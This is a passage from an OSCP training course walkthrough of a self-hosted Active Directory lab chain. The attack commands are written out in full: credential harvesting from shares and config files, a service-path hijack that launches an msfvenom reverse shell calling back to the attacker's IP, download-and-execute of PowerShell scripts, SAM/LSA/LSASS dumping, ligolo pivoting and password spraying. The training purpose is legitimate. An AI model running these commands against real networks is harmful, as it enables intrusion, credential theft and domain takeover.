
  
OSCP® Exam Prep CourseActive Directory Chains

Lesson 39 of 97

Completed

Start here8/8

Active Directory24/24

Active Directory Chains15/15

Chain 01: First ContactBuild a solid foundation for attacking Active Directory environments.Chain 02: StolenDevelop reliable credential access and lateral movement techniques.Chain 03: BleedWideExpand domain access through coordinated AD attacks and spraying.Chain 04: Inside JobLeverage pivoting to reach vulnerable services inside AD networks.Chain 05: GroupThinkPerform network pivoting and abuse misconfigured Group Policies to extend and maintain control.Chain 06: TrustfallShape misconfigurations and open services into borrowed authority.Chain 07: CrosslinkAbuse trusted access, traverse isolated networks, and escalate across hidden infrastructure.Chain 08: RicochetAbuse injectable endpoints, bypass their defense, and relay it across the domain to seize control.Chain 09: BloodhuntMap the hidden edges, and abuse what others overlook. Only the certified will be let through.Chain 10: ReplicantFollow the unseen edges, migrate into a living process, and make the controller surrender every secret.Chain 11: Cold StorageEscalate through a task, comb the host for credentials, and crack any encryption in your way.Chain 12: DelegateRun as the account left in the open, crack what the cache remembers, then delegate the rights to domain compromise.Chain 13: FailsafeDecrypt a GPP password, crack two vaults, and ride a WriteDacl edge to Domain Admin.Chain 14: Open RelayLeak a credential from SNMP, seize the Spooler for SYSTEM, then relay and reset your way to the domain.Chain 15: OverwriteHop a SQL linked server, loot LSA secrets twice, and reset an account to own the domain.

Initial Access17/17

Privilege Escalation15/15

Pivoting and Tunneling6/6

The Exam5/5

Notes and extras7/7

Lab

AD Chain_07

A domain controller and two Windows clients. Runs on your own machine. The download is sold in the shop, separate from membership, and is yours to keep.

[Get this chain](https://buymeacoffee.com/hackacademy/e/531933)[About this chain](https://hackerblueprint.com/labs#chain-07)[All chains bundle](https://buymeacoffee.com/hackacademy/e/582690)

Not startedStartedRooted

Wrote a walkthrough?

We'd love to see how you took this chain! Written up or on video, both are great. Email it to us and we'll take a look.

[Email your walkthrough](mailto:hacking.academy@protonmail.com?subject=Walkthrough%3A%20Chain%2007%3A%20Crosslink)

Tags

PivotingAD EnumerationPort ScanningPassword ReuseSMB EnumerationOSCP® Exam StrategyNTLM TheftNTLM Relay

PreviousCompletedNext: Chain 08: RicochetContinue

Chat  
and notesHelp[Ideas](https://discord.com/channels/1325919248954167468/1325966774881226862)

## Chain 07: Crosslink

Step 1 of 22

Close

0:00 / 2:31:58

Auto

1

Sweep the network and scan the client

BackNext step

Your lab addressesCLIENT-1 IPCLIENT-1 internal IPCLIENT-2 IPDC IPYour IPLab subnetInternal subnet

1. 1Sweep the network and scan the client_0:00_
    
    The lab gives one range and one credential. A sweep of the range finds a single live host, a Windows client in the domain hack-academy.local, and the credential is valid on it at once. A full TCP scan of that host then lists the services we can work with: SMB, RDP, WinRM and the RPC ports that come with a domain joined machine.
    
    Kali
    
    ```
    cd AD_CHAIN_7
    ```
    
    Copy
    
    Moves into the folder for this chain.
    
    **Why**Scans, notes and downloaded share files of one chain stay together for the report.
    
    Kali
    
    ```
    ls
    ```
    
    Copy
    
    Lists the folder and shows the credential file.
    
    **Why**The lab leaves one file, and it is the only credential the chain starts with.
    
    Kali
    
    ```
    cat starting_credentials.txt
    ```
    
    Copy
    
    Prints the starting credential.
    
    **Why**Every step below authenticates with this account, so it is read once and kept in the notes file.
    
    Kali
    
    ```
    ip route
    ```
    
    Copy
    
    Prints the routing table with the source address of our interface.
    
    **Why**The address tells us which subnet we may sweep and what the target can reach back to.
    
    Kali
    
    ```
    netexec smb 10.0.0.0/24
    ```
    
    Copy
    
    Sweeps the range over SMB with no credentials.
    
    **Why**One sweep finds the live hosts and names the domain, and this range has only one host in it.
    
    Kali
    
    ```
    nmap -v -p- -sV -sC -Pn 10.0.0.32 -oN nmap.log
    ```
    
    Copy
    
    Scans all TCP ports of the client with version and script probes, saving the output.
    
    **Why**-p- finds the high RPC ports and WinRM, and -Pn skips the discovery step that a hardened host may block.
    
    **Tip**When only one host answers, scan it properly rather than sweeping more. A full port list on one host is worth more than an open port survey of a hundred.
    
2. 2Confirm the credential on every service_5:00_
    
    The account is valid over WMI and RDP but refused by WinRM, so there is no remote shell yet and the way in is a desktop. That is the pattern to keep in mind for the rest of the chain: the account works, but only on some services of some hosts.
    
    Reading the saved scan again is not wasted time. It shows the RPC range and the WinRM port that the protocol checks just used, which is the map the later hosts are compared against.
    
    Kali
    
    ```
    netexec wmi 10.0.0.32 -u eturner -p 'Ya-Boy14'
    ```
    
    Copy
    
    Tests the credential over WMI and RPC.
    
    **Why**WMI answers on a port that is open even when no shell service is available, so it shows how far the account reaches.
    
    Kali
    
    ```
    netexec winrm 10.0.0.32 -u eturner -p 'Ya-Boy14'
    ```
    
    Copy
    
    Tests WinRM for the same account.
    
    **Why**WinRM would give a remote PowerShell session; the refusal means the account is not in the remote management group.
    
    Kali
    
    ```
    netexec rdp 10.0.0.32 -u eturner -p 'Ya-Boy14'
    ```
    
    Copy
    
    Tests RDP for the same account.
    
    **Why**RDP is the interactive route and it answers, which makes a desktop the next step if a share yields nothing.
    
    Kali
    
    ```
    cat nmap.log
    ```
    
    Copy
    
    Prints the saved port scan.
    
    **Why**The scan shows which services the host really exposes, and it is the reference for every later host.
    
    **Tip**Write down which service accepted which account. On a chain with several hosts, that table is what stops you retrying the same pair on the same service.
    
3. 3Spider the shares and read what it finds_6:20_
    
    The share listing shows two non-default shares next to the administrative ones: one for internal applications and one for IT support. A share like that is where a deployment script or a handover note lives, and a note often carries a password.
    
    The spider module walks both shares, downloads the small files and writes one index per host. Five files come back, three under IT support and two under internal applications, and the index lists the path and size of each so nothing has to be opened blind.
    
    Kali
    
    ```
    netexec smb 10.0.0.32 -u eturner -p 'Ya-Boy14' --shares
    ```
    
    Copy
    
    Lists the shares the account can read on the client.
    
    **Why**Two non-default shares are the only interesting thing the listing shows, and they become the target.
    
    Kali
    
    ```
    netexec smb 10.0.0.32 -u eturner -p 'Ya-Boy14' --shares -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=.
    ```
    
    Copy
    
    Walks every readable share, downloads the files and writes a JSON index for the host.
    
    **Why**The spider does in one command what clicking through a share does slowly, and the index keeps the original path of each file.
    
    Kali
    
    ```
    ls
    ```
    
    Copy
    
    Lists the working folder.
    
    **Why**The spider created a folder and an index file, and this shows the names it used.
    
    Kali
    
    ```
    cat 10.0.0.32.json
    ```
    
    Copy
    
    Prints the index of the spider run.
    
    **Why**The index names every file with its share and size, which is how we choose what to read first.
    
    **Tip**Read the index before the files. A file whose name mentions deploy, backup or credentials is worth opening first, and the sizes tell you which ones are notes rather than binaries.
    
4. 4Read the deployment script for credentials_8:20_
    
    The internal applications share holds two files: a readme and a deployment script. The readme is a plain description of the share and an address to contact for access, which is not an account: trying it as a user name fails at once.
    
    The deployment script is the find. It creates a service and hardcodes the account it runs as, with the password next to it, because the deployment has to authenticate to a file server. That is a second domain credential, and it is a service account, so it may have rights that a person does not.
    
    Kali
    
    ```
    cd InternalApps && ls
    ```
    
    Copy
    
    Changes into the share copy and lists it.
    
    **Why**Two files, and only one of them can hold a credential, so the order is by name.
    
    Kali
    
    ```
    cat readme.txt
    ```
    
    Copy
    
    Prints the readme of the share.
    
    **Why**It describes the share and gives a contact address, which is worth trying as an account name only because it costs one line.
    
    Kali
    
    ```
    netexec smb 10.0.0.32 -u it-support -p 'Ya-Boy14'
    ```
    
    Copy
    
    Tests the contact address as a user name with the password we hold.
    
    **Why**The refusal closes that idea and saves us from building a spray around a name that is not an account.
    
    Kali
    
    ```
    cat deploy.ps1
    ```
    
    Copy
    
    Prints the deployment script.
    
    **Why**A deployment script has to authenticate somewhere, so it carries a credential, and here it carries the account and the password in clear.
    
    Kali
    
    ```
    cp starting_credentials.txt notes
    ```
    
    Copy
    
    Copies the credential file to a notes file.
    
    **Why**The notes file is the growing record of the chain, and it starts from the credential the lab gave us.
    
    Kali
    
    ```
    gedit notes
    ```
    
    Copy
    
    Opens the notes file for editing.
    
    **Why**The new account and its password are written down next to the first one, with the host they work on.
    
    Kali (gedit)
    
    ```
    eturner : Ya-Boy14
    svc_webapi : Andrew,3
    ```
    
    Copy
    
    The file pass holds the two credentials as user and password pairs.
    
    **Why**Every later spray and login reads this file, so the credentials are typed once and reused by name.
    
    **Tip**A deployment script is a credential store. Read every script you find in a share before you spend time on a spray, because the account it uses is often the one with a service logon right.
    
5. 5Read the IT support notes_12:24_
    
    The second share holds three short notes. The backup schedule names a retired backup service account, which is a name to keep even though it is retired. The firewall note says outbound traffic is unrestricted and lists the three inbound ports, which explains why a reverse shell out of this host will work and why a bind shell from outside would not.
    
    The onboarding checklist is the useful one. It says new accounts get a temporary password made of a word and the current year, which turns a weak process into a small, precise guess list rather than a brute force.
    
    Kali
    
    ```
    cd ../
    ```
    
    Copy
    
    Moves up one level in the download folder.
    
    **Why**The two share folders sit side by side, so the next one is one level up.
    
    Kali
    
    ```
    cd IT-Support
    ```
    
    Copy
    
    Changes into the IT support share copy.
    
    **Why**This share had three files in the index, and all three are small notes.
    
    Kali
    
    ```
    ls
    ```
    
    Copy
    
    Lists the three notes in the folder.
    
    **Why**The names say what each one covers: a backup schedule, a firewall policy and an onboarding checklist.
    
    Kali
    
    ```
    cat backup-schedule.txt
    ```
    
    Copy
    
    Prints the backup schedule.
    
    **Why**It names the account the backups run as, which is a name to try later even if the note says it is retired.
    
    Kali
    
    ```
    cat firewall-policy.txt
    ```
    
    Copy
    
    Prints the firewall policy.
    
    **Why**Outbound allowed and three inbound ports is exactly the shape of access a reverse shell needs.
    
    Kali
    
    ```
    cat onboarding-checklist.txt
    ```
    
    Copy
    
    Prints the onboarding checklist.
    
    **Why**The temporary password pattern is written in the checklist, and a pattern is worth more than a wordlist for the accounts created this way.
    
    **Tip**Notes about process are as good as notes about passwords. A password policy described in a checklist turns into a short list you can test in a minute.
    
6. 6Log in as the service account_15:48_
    
    The notes file is printed to have the pair in front of us, then the service account is tested on every service. It is valid over SMB, WMI and RDP, and over WinRM it returns an administrative result, which is the difference from the first account: this one is in the remote management group on the client.
    
    The remote shell opens with the account in its own profile, and from here the machine can be examined without a desktop.
    
    Kali
    
    ```
    cat notes
    ```
    
    Copy
    
    Prints the notes file with both credentials.
    
    **Why**The pair is read from the file so the password with a comma in it is not retyped by hand.
    
    Kali
    
    ```
    netexec smb 10.0.0.32 -u svc_webapi -p 'Andrew,3'
    ```
    
    Copy
    
    Tests the service account over SMB.
    
    **Why**A valid answer is the base, and it confirms the credential from the script really works on the host.
    
    Kali
    
    ```
    netexec smb 10.0.0.32 -u svc_webapi -p 'Andrew,3' --shares
    ```
    
    Copy
    
    Lists the shares as the service account.
    
    **Why**The same shares as before, but this account may have more rights on them, which matters later.
    
    Kali
    
    ```
    netexec wmi 10.0.0.32 -u svc_webapi -p 'Andrew,3'
    ```
    
    Copy
    
    Tests the service account over WMI.
    
    **Why**WMI answers even when no shell service is open, so it shows the account can run commands remotely.
    
    Kali
    
    ```
    netexec rdp 10.0.0.32 -u svc_webapi -p 'Andrew,3'
    ```
    
    Copy
    
    Tests the service account over RDP.
    
    **Why**RDP is the fallback route and it answers, which is worth knowing before the shell attempt.
    
    Kali
    
    ```
    netexec winrm 10.0.0.32 -u svc_webapi -p 'Andrew,3'
    ```
    
    Copy
    
    Tests the service account over WinRM.
    
    **Why**An administrative WinRM result means a remote PowerShell session with full control of the host.
    
    Kali
    
    ```
    evil-winrm -i 10.0.0.32 -u svc_webapi -p 'Andrew,3'
    ```
    
    Copy
    
    Opens the remote PowerShell session as the service account.
    
    **Why**The session is the working shell for the rest of the host work, and it carries the administrative rights the WinRM check reported.
    
    **Tip**A service account is often in the remote management group because services need to be administered remotely. Test WinRM first with any account whose name ends in svc.
    
7. 7Find the second network card_17:56_
    
    The address listing in the new session shows two adapters: the one we came in on, and a second one on a subnet we have never seen. The listener list confirms the same picture from the other direction, because the host has a listener bound to the second address and nothing else on it.
    
    On our side the tool folder is prepared: the privilege scripts are published with a plain web server, and our own address is confirmed so the target can pull from it.
    
    CLIENT-1 (WinRM)
    
    ```
    ipconfig
    ```
    
    Copy
    
    Prints both adapters and their addresses.
    
    **Why**A second adapter on a different subnet is the signal that the machine sits between two networks and can be used as a pivot.
    
    Kali
    
    ```
    cd /opt/tools/
    ```
    
    Copy
    
    Moves to the privilege escalation tools.
    
    **Why**The tools are served from this folder, and it already holds everything the Windows hosts need.
    
    Kali
    
    ```
    ls
    ```
    
    Copy
    
    Lists the tools in the folder.
    
    **Why**Seeing the names avoids a failed download later, when the target reports a missing file.
    
    Kali
    
    ```
    ip a
    ```
    
    Copy
    
    Prints our interfaces and addresses.
    
    **Why**The target downloads from us, so our own address on the shared network has to be confirmed.
    
    CLIENT-1 (WinRM)
    
    ```
    ipconfig
    ```
    
    Copy
    
    Prints the adapters again from the target.
    
    **Why**The same two subnets, read inside the session, confirm which one our machine can reach and which one it cannot.
    
    CLIENT-1 (WinRM)
    
    ```
    netstat -ano | findstr /i listen
    ```
    
    Copy
    
    Lists the listening sockets with the owning process ids.
    
    **Why**The listeners on the second address show the host serves traffic on that network, which is what a pivot needs.
    
    **Tip**Two adapters on one host is the cheapest pivot you will ever get. Read the second subnet from the host, not from your own routing table, because your table will not have it.
    
8. 8Run the privilege checks on the client_22:28_
    
    The host is staged with the two checkers. The first download has to be repeated with the basic parsing switch, because the web client falls back to an old engine that is not available on the host, and the plain download writes the script to disk where the second attempt runs it from the file system.
    
    The checks report nothing critical about patches or registry settings, which keeps the focus on services. That is where the next step goes, and the service name comes from the deployment script we read in the share.
    
    Kali
    
    ```
    python3 -m http.server 80
    ```
    
    Copy
    
    Serves the tool folder over HTTP on port 80.
    
    **Why**The target fetches the scripts from us, and one server serves every tool in the folder.
    
    CLIENT-1 (WinRM)
    
    ```
    wget 10.0.0.30/PowerUp.ps1 -o PowerUp.ps1
    ```
    
    Copy
    
    Downloads the first script into the tasks folder.
    
    **Why**Saving the file first makes the next runs repeatable, and the tasks folder is writable for every user.
    
    CLIENT-1 (WinRM)
    
    ```
    ls
    ```
    
    Copy
    
    Lists the folder to confirm the download.
    
    **Why**The size check is the simplest proof that the file arrived whole.
    
    CLIENT-1 (WinRM)
    
    ```
    wget -useb 10.0.0.30/PowerUp.ps1|iex;Invoke-AllChecks
    ```
    
    Copy
    
    Downloads the script again with basic parsing and runs every check in memory.
    
    **Why**The basic parsing switch avoids the old web engine, and running from memory leaves no second copy on disk.
    
    CLIENT-1 (WinRM)
    
    ```
    wget -useb 10.0.0.30/PrivescCheck.ps1|iex;Invoke-PrivescCheck
    ```
    
    Copy
    
    Downloads the second checker and runs its full list of checks.
    
    **Why**A second tool reads the same system differently and reports service, task and credential findings the first one skips.
    
    **Tip**The old web engine error is common on server images. Add the basic parsing switch, or download the file first and run it from disk.
    
9. 9Repoint the web API service at our shell_32:12_
    
    The deployment script said the service is called WebAPISvc, and that name is wrong: three attempts fail with the service does not exist error. The real name is one word longer, and the query proves it as soon as the right name is used.
    
    The configuration matters more than the state. The service starts on demand and runs as the local system account, and our account is an administrator on the host, so the binary path can be changed. The payload is built for our address and the port the listener will use, it is downloaded into the tasks folder, and the service is pointed at it. Starting the service runs the payload as system, and the identity check on the listener confirms it.
    
    Kali
    
    ```
    ls
    ```
    
    Copy
    
    Lists the tools and the payload in the folder.
    
    **Why**The folder holds the scripts and the payload, and the listing confirms the payload exists after the build.
    
    Kali
    
    ```
    msfvenom -p windows/x64/shell_reverse_tcp -a x64 --platform windows LHOST=10.0.0.30 LPORT=443 -f exe > shell.exe
    ```
    
    Copy
    
    Builds a 64-bit reverse shell executable that calls back to us on port 443.
    
    **Why**The executable is what the service will run, and the port has to match the listener exactly.
    
    CLIENT-1 (WinRM)
    
    ```
    wget -useb 10.0.0.30/shell.exe -o shell.exe
    ```
    
    Copy
    
    Downloads the payload into the tasks folder.
    
    **Why**The service binary path has to point at a file the target can read, and the tasks folder is writable.
    
    CLIENT-1 (WinRM)
    
    ```
    ls
    ```
    
    Copy
    
    Lists the folder to confirm the payload and its size.
    
    **Why**The size is the same as the build output, which proves the download completed.
    
    CLIENT-1 (WinRM)
    
    ```
    sc.exe config WebAPIService binpath= "C:\windows\tasks\shell.exe"
    ```
    
    Copy
    
    Changes the binary path of the service to our payload.
    
    **Why**An administrator on the host may change the configuration of a service, and this one runs as system.
    
    CLIENT-1 (WinRM)
    
    ```
    sc.exe query WebAPIService
    ```
    
    Copy
    
    Prints the state of the service.
    
    **Why**The service is stopped, so nothing runs until we start it, which keeps the timing under control.
    
    CLIENT-1 (WinRM)
    
    ```
    sc.exe qc WebAPIService
    ```
    
    Copy
    
    Prints the configuration, including the new path and the account.
    
    **Why**The query confirms both the path we set and the system account that will run it.
    
    Kali
    
    ```
    rlwrap nc -lvnp 443
    ```
    
    Copy
    
    Starts a listener on the port in the payload.
    
    **Why**The service starts our binary, which connects out, so the listener has to be ready first.
    
    CLIENT-1 (WinRM)
    
    ```
    sc.exe start WebAPIService
    ```
    
    Copy
    
    Starts the service, which launches the payload.
    
    **Why**The service manager starts our process as the system account, and the callback lands on the listener.
    
    CLIENT-1 (SYSTEM)
    
    ```
    whoami
    ```
    
    Copy
    
    Prints the identity of the reverse shell.
    
    **Why**The answer is the local system account, which is the escalation the service configuration allowed.
    
    **Tip**Read the real service name from the registry or the service list, not from a script. A script that names a service can be out of date, and a wrong name looks exactly like a missing service.
    
10. 10Make the account an admin and dump secrets_37:40_
    
    A shell as system is powerful but it dies with the process, so the service account is added to the local administrators first. That keeps administrative access over the network after the payload is gone, and the next check confirms it with an administrative result on the host.
    
    Three stores are then read with the account: the local hashes, the logon process memory, and the LSA secrets. The local hashes belong to the machine, and the LSA secrets hold the machine account keys and the cached domain logons. Here the cache is empty of new users, which tells us the next identity has to come from somewhere else on the host.
    
    CLIENT-1 (SYSTEM)
    
    ```
    net localgroup administrators svc_webapi /add
    ```
    
    Copy
    
    Adds the service account to the local administrators group.
    
    **Why**A group membership survives the shell and gives administrative access over the network without the payload.
    
    Kali
    
    ```
    cat notes
    ```
    
    Copy
    
    Prints the notes file with the two credentials.
    
    **Why**The record is checked before the dump, so the report has the accounts in order.
    
    Kali
    
    ```
    netexec smb 10.0.0.32 -u svc_webapi -p 'Andrew,3'
    ```
    
    Copy
    
    Tests the service account after the group change.
    
    **Why**The administrative result on the host is the proof that the membership took effect.
    
    Kali
    
    ```
    netexec smb 10.0.0.32 -u svc_webapi -p 'Andrew,3' --sam
    ```
    
    Copy
    
    Dumps the local SAM hashes from the host.
    
    **Why**Local hashes matter on other machines that reuse a local administrator password.
    
    Kali
    
    ```
    netexec smb 10.0.0.32 -u svc_webapi -p 'Andrew,3' -M lsassy
    ```
    
    Copy
    
    Runs a module that looks for credentials in the logon process memory.
    
    **Why**A module run costs a second and sometimes finds plain text the registry stores do not keep.
    
    Kali
    
    ```
    netexec smb 10.0.0.32 -u svc_webapi -p 'Andrew,3' -M nanodump
    ```
    
    Copy
    
    Dumps the memory of the logon process to a file and downloads it.
    
    **Why**The dump is kept for offline analysis when a module finds nothing.
    
    Kali
    
    ```
    netexec smb 10.0.0.32 -u svc_webapi -p 'Andrew,3' --lsa
    ```
    
    Copy
    
    Dumps the LSA secrets from the host.
    
    **Why**The cached domain logons are here, and an empty cache is itself the answer to where the next account comes from.
    
    **Tip**Always leave a group membership behind when you have system. A reverse shell is one crash away from gone, and a local administrator is not.
    
11. 11Enumerate the host from the system shell_42:20_
    
    The reverse shell lands in a command prompt, where the first command fails because it is not a shell built in. Starting PowerShell from it gives a usable session, and the root listing shows two folders that a default install does not have: one for services and one for shares.
    
    The recycle bin is examined because deleted files sometimes hold a configuration a user removed by hand. The folder needs quotes around its name, because the dollar sign otherwise starts a variable, and the forced listing then shows one hidden folder per account. Both are empty or hold only the desktop settings file, so the recycling is a dead end.
    
    The local account list and the domain account list are the last thing here. The domain list holds several service accounts, and those names are what the next search is built around.
    
    CLIENT-1 (SYSTEM)
    
    ```
    ls
    ```
    
    Copy
    
    Runs the listing command that a command prompt does not have.
    
    **Why**The failure is worth seeing once: the shell is a command prompt, so the Unix style listing has to wait for PowerShell.
    
    CLIENT-1 (SYSTEM)
    
    ```
    powershell
    ```
    
    Copy
    
    Starts PowerShell from the command prompt.
    
    **Why**PowerShell gives the object pipeline the next steps need, and it is installed on every Windows host.
    
    CLIENT-1 (SYSTEM)
    
    ```
    ls
    ```
    
    Copy
    
    Lists the root of the system drive.
    
    **Why**Two folders that a default install does not create stand out and tell us where the application files live.
    
    CLIENT-1 (SYSTEM)
    
    ```
    cd '$Recycle.Bin'
    ```
    
    Copy
    
    Changes into the recycle bin folder.
    
    **Why**The name needs single quotes, because the dollar sign would otherwise be read as the start of a variable.
    
    CLIENT-1 (SYSTEM)
    
    ```
    whoami /all
    ```
    
    Copy
    
    Prints the groups of the system account.
    
    **Why**The administrator group in the token confirms the shell really is the highest account on the host.
    
    CLIENT-1 (SYSTEM)
    
    ```
    ls -force
    ```
    
    Copy
    
    Lists the recycle bin including hidden items.
    
    **Why**The recycle bin hides one folder per account, and the plain listing shows none of them.
    
    CLIENT-1 (SYSTEM)
    
    ```
    net users
    ```
    
    Copy
    
    Prints the local accounts of the host.
    
    **Why**A local account with a reused password is a way onto other machines, so the local list is worth reading.
    
    CLIENT-1 (SYSTEM)
    
    ```
    net users /domain
    ```
    
    Copy
    
    Asks the controller for the domain account list.
    
    **Why**The domain list names every service account, and those names become the search terms for the next step.
    
    **Tip**Quote any path that contains a dollar sign. PowerShell expands it as a variable and either fails or silently points at a folder that does not exist.
    
12. 12Search the disk for the account names_45:58_
    
    The domain list is trimmed to the accounts that matter, one name per line, and the names are turned into a comma separated list in quotes so they can be pasted into a search pattern. That file is worth keeping, because the same pattern is used on every host.
    
    The search covers the whole disk, skips the Windows folder, and looks inside configuration, script, log and key files for a password keyword or one of the account names. The first run drowns the screen, because application data holds thousands of localisation files. Each run adds one exclusion, and after four passes the output is two lines: a configuration file with a service account name and the deployment script we already read.
    
    Kali (gedit)
    
    ```
    Administrator
    kpatel
    svc_legacy
    svc_update
    eturner
    svc_monitor
    svc_webapi
    svc_admin
    svc_reports
    ```
    
    Copy
    
    The file users holds the account names that matter, one per line.
    
    **Why**The names come from the domain listing, and the file is the input for the pattern that is built next.
    
    Kali
    
    ```
    paste -sd, users | sed 's/[^,]*/"&"/g'
    ```
    
    Copy
    
    Turns the name list into a quoted comma separated list.
    
    **Why**The pattern for the search is a list of quoted names, and building it by hand invites a typo.
    
    CLIENT-1 (SYSTEM)
    
    ```
    Get-ChildItem -Path C:\ -Recurse -Force -Include *.config,*.ini,*.xml,*.bak,*.txt,*.ps1,*.log,*.json,*.yml,*.yaml,*.env,*.cs,*.vb,*.vbs,*.key,*.pem,*.crt,*.rdp,*.kdbx -File -ErrorAction SilentlyContinue | Where-Object { $_.FullName -notmatch '(C:\\Windows|C:\\Program Files\\WindowsApps|C:\\ProgramData\\Microsoft\\Windows|C:\\Users\\All Users\\Microsoft|C:\\Users\\Nick\\)' } | Select-String -Pattern "pwd=", "password=", "username=", "user=", "pass=", "Administrator","kpatel","svc_legacy","svc_update","eturner","svc_monitor","svc_webapi","svc_admin","svc_reports"
    ```
    
    Copy
    
    Searches the whole disk for configuration and script files that mention a password or one of the account names, excluding the noisy folders.
    
    **Why**The exclusions are what make the output readable, and the two lines that remain name the files worth opening.
    
    **Tip**Build the search terms once and exclude noise one folder at a time. A recursive search that floods the screen teaches nothing, and the interesting line scrolls away.
    
13. 13Read the web configuration and take the password_59:12_
    
    The first hit is a configuration file for a web service, and the file names the account the service runs as plus its password, both in clear. That is a domain user, so the credential is worth the same as any other, and it goes into the notes next to the two we have.
    
    The password follows the onboarding pattern from the checklist: a word and a year, here with a symbol at the front and the year at the end. That is exactly the kind of password a policy produces, and the note about the pattern is what makes it reusable on other accounts.
    
    CLIENT-1 (SYSTEM)
    
    ```
    cat C:\Services\WebConfig\appsettings.json
    ```
    
    Copy
    
    Prints the application configuration file.
    
    **Why**The service settings hold the account and password the application uses, which is the third credential of the chain.
    
    Kali
    
    ```
    cat notes
    ```
    
    Copy
    
    Prints the notes file of the chain.
    
    **Why**The notes are the record of the chain, and the new pair is added in the same form as the others.
    
    Kali (gedit)
    
    ```
    gedit notes
    ```
    
    Copy
    
    Opens the notes file to add the account and its password.
    
    **Why**The pair is written with the file it came from, which is what the report needs.
    
    Kali (gedit)
    
    ```
    pass file ->
    Ya-Boy14
    Andrew,3
    100%Mary
    ```
    
    Copy
    
    The file pass holds the passwords alone, with the new one added.
    
    **Why**The spray takes a file of passwords, so a separate list is kept next to the user and password pairs.
    
    **Tip**Keep two files: one with the user and password pairs and where each came from, and one with passwords only for spraying. Rewriting the spray list by hand is how a password gets lost.
    
14. 14Build a tunnel into the second network_1:02:36_
    
    The second subnet cannot be reached from our machine, but the client can reach it, so the tunnel goes through the client. The proxy runs on Kali with a generated certificate, and the agent runs on the client and connects back out. The agent binary is published by the same web server that served the checkers and pulled into the tasks folder.
    
    The console belongs to the proxy. We select the session, read the interfaces the agent reports, create an interface on our side, attach the internal subnet as its route, and start the tunnel. Only after the start does the route become live, which is why a scan before it finds nothing.
    
    Kali
    
    ```
    cd /opt/tools/pivoting
    ```
    
    Copy
    
    Moves to the pivoting tools.
    
    **Why**The proxy and the agent for the tunnel are both in this folder.
    
    Kali
    
    ```
    ls
    ```
    
    Copy
    
    Lists the pivoting tools.
    
    **Why**The listing shows the proxy, the agent and a chisel binary, which are the two options for this job.
    
    Kali
    
    ```
    ./proxy -selfcert
    ```
    
    Copy
    
    Starts the proxy with a self-signed certificate.
    
    **Why**The agent skips certificate validation, so a generated certificate is enough and no public name is needed.
    
    Kali (ligolo)
    
    ```
    iflist
    ```
    
    Copy
    
    Lists the interfaces of the proxy and their routes.
    
    **Why**The interface table shows a default interface with pending routes, which is the state before a session exists.
    
    Kali (ligolo)
    
    ```
    ifdel --name ligolo
    ```
    
    Copy
    
    Deletes the default interface.
    
    **Why**Starting clean means the only interface and route are the ones we create and can remove later.
    
    Kali
    
    ```
    python3 -m http.server 80
    ```
    
    Copy
    
    Serves the pivoting folder over HTTP on port 80.
    
    **Why**The client pulls the agent from us, and the same server is used for the later tools.
    
    CLIENT-1 (WinRM)
    
    ```
    wget 10.0.0.30/agent.exe -o agent.exe
    ```
    
    Copy
    
    Downloads the agent into the tasks folder.
    
    **Why**The agent is a single binary and runs as the account we already have, so no privilege is needed.
    
    CLIENT-1 (WinRM)
    
    ```
    .\agent.exe -connect 10.0.0.30:11601 -ignore-cert
    ```
    
    Copy
    
    Starts the agent against our proxy address and port, skipping certificate validation.
    
    **Why**A connection from the client to us crosses the firewall in the direction that is normally open.
    
    Kali (ligolo)
    
    ```
    session
    ```
    
    Copy
    
    Lists the sessions and selects the one that just joined.
    
    **Why**Each agent that connects is a session, and every interface and route command applies to the selected one.
    
    Kali (ligolo)
    
    ```
    ifconfig
    ```
    
    Copy
    
    Prints the adapters reported by the agent.
    
    **Why**The agent sees both subnets, which confirms the second one is reachable through this host.
    
    Kali (ligolo)
    
    ```
    help
    ```
    
    Copy
    
    Prints the commands of the agent console.
    
    **Why**The console has its own command set, and the help names the interface and route commands exactly.
    
    Kali (ligolo)
    
    ```
    ifcreate --name ligolo
    ```
    
    Copy
    
    Creates an interface on our side and names it.
    
    **Why**The route is attached to a named interface, which keeps tunnel traffic apart from our own.
    
    Kali (ligolo)
    
    ```
    route_add --name ligolo --route 10.0.2.0/24
    ```
    
    Copy
    
    Adds the internal subnet as a route on that interface.
    
    **Why**This is what sends traffic for the second network into the tunnel instead of to our default gateway.
    
    Kali (ligolo)
    
    ```
    start --tun ligolo
    ```
    
    Copy
    
    Starts the tunnel on the named interface.
    
    **Why**The route stays pending until the tunnel runs, and the start is what installs it on our machine.
    
    Kali
    
    ```
    netexec smb 10.0.2.0/24
    ```
    
    Copy
    
    Sweeps the internal subnet over SMB through the tunnel.
    
    **Why**The sweep now lists the second client, the controller and one more host, all of which were invisible before.
    
    **Tip**Scan the internal subnet only after the tunnel reports it is relaying. A scan before the start returns nothing at all and looks like a firewall.
    
15. 15Spray the new credential inside the tunnel_1:08:28_
    
    Back in the chain folder, the password file is printed and the new account is tested against the controller through the tunnel. It is valid, so the three internal hosts are written into a target file and the whole set is tested at once.
    
    The account is valid on all three hosts. Over WinRM it is administrative on the second client only, and over RDP it reaches the first client. The share listing then adds the detail that matters: the second client publishes a backup share, which is a folder full of scripts that run on a schedule.
    
    Kali
    
    ```
    cd ~/AD_CHAIN_7
    ls
    ```
    
    Copy
    
    Moves back to the chain folder and lists it.
    
    **Why**The password file and the downloaded share copies are here, and the tunnel work is finished for now.
    
    Kali
    
    ```
    cat pass
    ```
    
    Copy
    
    Prints the password file.
    
    **Why**The file holds three passwords, and the spray below takes them by name.
    
    Kali
    
    ```
    netexec smb 10.0.2.100 -u kpatel -p '100%Mary'
    ```
    
    Copy
    
    Tests the new account against the controller through the tunnel.
    
    **Why**One host first proves the credential and the route before the whole list is used.
    
    Kali (gedit)
    
    ```
    10.0.2.27
    10.0.2.26
    10.0.2.100
    ```
    
    Copy
    
    The file ips holds the three internal hosts, one address per line.
    
    **Why**Every later tool takes the same list, so the three hosts are typed once.
    
    Kali
    
    ```
    netexec smb ips -u kpatel -p '100%Mary'
    ```
    
    Copy
    
    Sprays the account against all three hosts over SMB.
    
    **Why**A valid answer on every host makes the account a working identity across the internal network.
    
    Kali
    
    ```
    netexec winrm ips -u kpatel -p '100%Mary'
    ```
    
    Copy
    
    Tests the account over WinRM on the three hosts.
    
    **Why**The administrative result on the second client is the way onto that machine.
    
    Kali
    
    ```
    netexec wmi ips -u kpatel -p '100%Mary'
    ```
    
    Copy
    
    Tests the account over WMI.
    
    **Why**WMI answers on all three, which shows the account reaches the remote registry and service interfaces.
    
    Kali
    
    ```
